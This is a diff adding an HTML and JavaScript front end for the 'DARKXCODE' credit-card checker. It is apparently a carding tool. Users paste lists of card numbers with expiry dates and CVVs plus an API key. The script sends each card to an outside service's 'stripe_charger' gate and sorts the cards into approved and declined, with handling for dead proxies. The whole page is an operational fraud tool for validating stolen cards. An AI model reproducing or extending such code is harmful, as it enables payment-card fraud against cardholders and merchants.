@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>DARKXCODE | CHECKER</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon.png">
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,300,400,500,600%7CRoboto:400" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="assets/css/pace.css">
+    <link href="assets/css/style.css" rel="stylesheet">
+    
+    <!-- Head Libs -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js" data-pace-options='{ "ajax": false, "selectors": [ "img" ]}'></script>
+</head>
+
+<body class="content-dark">
+    <main class="main-wrapper clearfix">
+        <!-- Page Title Area -->
+        <div class="row page-title clearfix">
+            <div class="page-title-left">
+                <h6 class="page-title-heading mr-0 mr-r-5"><strong>DARKXCODE</strong></h6>
+                <p class="page-title-description mr-0 d-none d-md-inline-block"></p>
+            </div>
+        </div>
+        <!-- /.page-title -->
+        
+        <div class="widget-list row">
+            <!-- Stripe Charger Widget -->
+            <div class="widget-holder widget-full-height widget-flex col-lg-6">
+                <div class="widget-bg">
+                    <div class="widget-heading">
+                        <h5 class="widget-title">[!] Stripe Charger [!]</h5>
+                        <div class="widget-graph-info">
+                            <div class="dropdown">
+                                <a href="javascript:void(0)" class="dropdown-toggle text-muted fs-16" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <i class="fa fa-ellipsis-v"></i>
+                                </a>
+                                <div class="dropdown-menu dropdown-menu-right">
+                                    <a class="dropdown-item" href="#">Action</a>
+                                    <a class="dropdown-item" href="#">Another action</a>
+                                    <a class="dropdown-item" href="#">Something else here</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="widget-body">
+                        <button type="button" id="sh_apr" onclick="toggleView('approvedapp')" class="btn btn-success gradient-purple-blue">
+                            APPROVED [ <span id="approved_count">0</span> ]
+                        </button>
+                        <br>
+                        <div id="approvedapp" style="display:none;"></div>
+                        <br><br>
+                        
+                        <button type="button" id="sh_rep" onclick="toggleView('rejectedapp')" class="btn btn-danger gradient-orange-red">
+                            DECLINED [ <span id="rejected_count">0</span> ]
+                        </button>
+                        <br>
+                        <div id="rejectedapp" style="display:none;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- CC List Widget -->
+            <div class="widget-holder widget-full-content widget-full-height col-lg-6">
+                <div class="widget-bg">
+                    <div class="widget-heading">
+                        <h5 class="widget-title">! FILL YOUR CC LISTS !</h5>
+                        <div class="widget-graph-info">
+                            <div class="dropdown">
+                                <a href="javascript:void(0)" class="dropdown-toggle text-muted fs-16" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <i class="fa fa-ellipsis-v"></i>
+                                </a>
+                                <div class="dropdown-menu dropdown-menu-right">
+                                    <a class="dropdown-item" href="#">Action</a>
+                                    <a class="dropdown-item" href="#">Another action</a>
+                                    <a class="dropdown-item" href="#">Something else here</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="widget-body">
+                        <div class="container-fluid pd-20">
+                            <div class="row">
+                                <div class="col">
+                                    <textarea id="listNya" placeholder="FORMAT: 0000000000000000|00|0000|000" class="form-control" style="resize:vertical; outline:none; height:150px;" required></textarea><br>
+                                    <input id="apikey" type="text" class="form-control" placeholder="APIKEY" required><br>
+                                    
+                                    <button type="button" id="iniciar" onclick="startChecker()" class="btn btn-success gradient-purple-blue">Start</button>
+                                    <button type="button" onclick="stopChecker()" id="parar" class="btn btn-danger gradient-orange-red">Stop</button>
+                                    <button type="button" onclick="clearList()" class="btn btn-primary gradient-orange-yellow">Clear</button>
+
+                                    <br><br>
+                                    
+                                    <div class="status-info">
+                                        <small>
+                                            STATUS: <span class="badge badge-pill badge-primary" id="demo">WAITING FOR BEGINNING</span> -
+                                            APPROVED: <span id="CLIVE" class="badge badge-success">0</span> -
+                                            DECLINED: <span id="CDIE" class="badge badge-danger">0</span> -
+                                            TESTED: <span id="testing" class="badge badge-warning">0</span> -
+                                            TOTAL: <span id="totalCC" class="badge badge-info">0</span>
+                                        </small>
+                                    </div>
+
+                                    <br>
+                                    
+                                    <div class="time-info">
+                                        Time: <span class="badge badge-primary" id="hours">NULL</span>
+                                    </div>
+
+                                    <br>
+                                    
+                                    <p>Edited By : <a target="_blank" href="https://t.me/zlaxtert" rel="noopener noreferrer">Zlaxtert</a></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="assets/js/theme.js"></script>
+    <script src="assets/js/custom.js"></script>
+    
+    <!-- Main Script -->
+    <script>        
+    // Global variables
+        let isChecking = false;
+        let currentIndex = 0;
+        let ccList = [];
+        let audio, audio2;
+        
+        // Initialize page
+        $(document).ready(function() {
+            // Initialize audio
+            audio = new Audio('audio/blop.mp3');
+            audio2 = new Audio('audio/bot.mp3');
+            
+            // Start clock
+            updateClock();
+            setInterval(updateClock, 1000);
+            
+            // Calculate total CCs
+            $('#listNya').on('input', function() {
+                calculateTotalCCs();
+            });
+        });
+        
+        // Clock function
+        function updateClock() {
+            const d = new Date();
+            $('#hours').text(d.toLocaleTimeString());
+        }
+        
+        // Toggle view function
+        function toggleView(elementId) {
+            $('#' + elementId).toggle();
+        }
+        
+        // Calculate total CCs
+        function calculateTotalCCs() {
+            const list = $('#listNya').val().trim();
+            const count = list ? list.split('\n').filter(line => line.trim() !== '').length : 0;
+            $('#totalCC').text(count);
+        }
+        
+        // Clear list
+        function clearList() {
+            const listNya = $('#listNya').val();
+            if (!listNya) {
+                $('#demo').text('Load the list before cleaning it!');
+                audio2.play();
+                return;
+            }
+            
+            $('#listNya').val('');
+            $('#demo').text('Clean list.');
+            $('#totalCC').text('0');
+            audio.play();
+        }
+        
+        // Remove first line
+        function removeFirstLine(textareaId) {
+            const lines = $(textareaId).val().split('\n');
+            if (lines.length > 1) {
+                $(textareaId).val(lines.slice(1).join('\n'));
+            } else {
+                $(textareaId).val('');
+            }
+            calculateTotalCCs();
+        }
+        
+        // Start checker
+        function startChecker() {
+            const listNya = $('#listNya').val().trim();
+            if (!listNya) {
+                $('#demo').text('UPLOAD READY!');
+                audio2.play();
+                return;
+            }
+            
+            const apikey = $('#apikey').val().trim();
+            if (!apikey) {
+                $('#demo').text('API KEY REQUIRED!');
+                audio2.play();
+                return;
+            }
+            
+            isChecking = true;
+            $('#demo').text('STARTED');
+            audio.play();
+            
+            ccList = listNya.split('\n').filter(line => line.trim() !== '');
+            currentIndex = 0;
+            
+            processNextCC(apikey);
+        }
+        
+        // Process next CC
+        function processNextCC(apikey) {
+            if (!isChecking || currentIndex >= ccList.length) {
+                isChecking = false;
+                $('#demo').text('COMPLETED');
+                return;
+            }
+            
+            const cc = ccList[currentIndex];
+            checkCC(cc, apikey);
+        }
+        
+        // Check CC function
+        function checkCC(cc, apikey) {
+            $.ajax({
+                url: "https://api.darkxcode.site/checker/cc-checkerV4.5/bot_tele/",
+                method: "GET",
+                data: {
+                    cc: cc,
+                    gate: "stripe_charger",
+                    apikey: apikey
+                },
+                success: function(response) {
+                    updateResults(response, cc);
+                    removeFirstLine('#listNya');
+                    currentIndex++;
+                    processNextCC(apikey);
+                },
+                error: function() {
+                    $('#demo').text('ERROR!');
+                    $('#testing').text(parseInt($('#testing').text()) + 1);
+                    $('#CDIE').text(parseInt($('#CDIE').text()) + 1);
+                    $('#rejected_count').text(parseInt($('#rejected_count').text()) + 1);
+                    $('#rejectedapp').append(response + '<br>');
+                    removeFirstLine('#listNya');
+                    currentIndex++;
+                    processNextCC(apikey);
+                }
+            });
+        }
+        
+        // Update results
+        function updateResults(response, cc) {
+            $('#testing').text(parseInt($('#testing').text()) + 1);
+            
+            if (response.includes('"status":"success"')) {
+                $('#demo').text('APPROVED!');
+                $('#CLIVE').text(parseInt($('#CLIVE').text()) + 1);
+                $('#approved_count').text(parseInt($('#approved_count').text()) + 1);
+                $('#approvedapp').append(response + '<br>');
+                playSuccessSound();
+            } 
+            else if (response.includes("proxy is dead or proxy type is wrong!")) {
+                $('#demo').text('PROXY DIE!');
+                // Retry logic could be added here
+            } 
+            else if (response.includes("proxy limit or proxy not support!")) {
+                $('#demo').text('PROXY DIE!');
+                // Retry logic could be added here
+            } 
+            else if (response.includes('"status":"failed"')) {
+                $('#demo').text('DECLINED!');
+                $('#CDIE').text(parseInt($('#CDIE').text()) + 1);
+                $('#rejected_count').text(parseInt($('#rejected_count').text()) + 1);
+                $('#rejectedapp').append(response + '<br>');
+            } 
+            else {
+                $('#demo').text('ERROR!');
+                $('#CDIE').text(parseInt($('#CDIE').text()) + 1);
+                $('#rejectedapp').append(response + '<br>');
+            }
+        }
+        
+        // Stop checker
+        function stopChecker() {
+            isChecking = false;
+            $('#demo').text('PAUSED!');
+            audio2.play();
+        }
+        
+        // Play success sound
+        function playSuccessSound() {
+            audio.currentTime = 0;
+            audio.play();
+        }
+        
+        // Notification function
+        function notifyMe(message, status) {
+            if (!("Notification" in window)) {
+                console.log("This browser does not support desktop notification");
+                return;
+            }
+            
+            if (Notification.permission === "granted") {
+                showNotification(message, status);
+            } 
+            else if (Notification.permission !== 'denied') {
+                Notification.requestPermission().then(function(permission) {
+                    if (permission === "granted") {
+                        showNotification(message, status);
+                    }
+                });
+            }
+        }
+        
+        // Show notification
+        function showNotification(message, status) {
+            const options = {
+                body: message,
+                icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Checkmark.svg/200px-Checkmark.svg.png",
+                dir: "auto"
+            };
+            new Notification("DARKXCODE " + status, options);
+        }
+        </script>
+    
+    <style>
+        .gradient-purple-blue {
+            background-image: linear-gradient(45deg, #9000ff, #0069d4);
+            border-color: #ffffff;
+        }
+        
+        .gradient-orange-red {
+            background-image: linear-gradient(45deg, #fc9210, #dd2222);
+            border-color: #ffffff;
+        }
+        
+        .status-info {
+            margin: 10px 0;
+        }
+        
+        .time-info {
+            margin: 10px 0;
+        }
+        
+        #approvedapp, #rejectedapp {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</body>
+</html>
